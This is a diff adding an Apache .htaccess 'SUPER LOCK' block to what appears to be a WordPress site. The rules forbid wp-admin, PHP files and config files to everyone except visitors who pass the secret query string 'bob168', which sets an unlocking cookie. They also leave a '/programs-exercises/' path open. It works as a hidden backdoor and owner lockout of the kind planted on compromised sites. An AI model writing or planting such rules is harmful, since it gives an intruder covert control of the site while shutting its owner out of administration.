@@ -1,0 +1,51 @@
+# BEGIN SUPER LOCK - UNIVERSAL
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+
+RewriteCond %{REQUEST_URI} ^/programs-exercises/ [NC]
+RewriteRule .* - [L]
+
+RewriteRule ^index\.php$ - [L]
+
+RewriteCond %{REQUEST_URI} \.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot|pdf|zip|mp4|webm)$ [NC]
+RewriteRule .* - [L]
+
+RewriteCond %{QUERY_STRING} bob168 [NC]
+RewriteRule .* - [CO=unlock_site:1:%{HTTP_HOST}:/,L]
+
+RewriteCond %{HTTP_COOKIE} unlock_site=1 [NC]
+RewriteRule .* - [L]
+
+RewriteCond %{REQUEST_URI} \.php$ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} \.phtml$ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} \.(xml|txt|sql|bak|log|ini|sh|md|conf|json)$ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} ^/wp-admin/ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} ^/wp-includes/ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} ^/wp-content/ [NC]
+# Kecuali file statis di dalamnya (sudah diizinkan di atas)
+RewriteCond %{REQUEST_URI} !\.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} wp-config\.php [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_URI} \.htaccess [NC]
+RewriteRule .* - [F]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+
+</IfModule>
+# END SUPER LOCK - UNIVERSAL
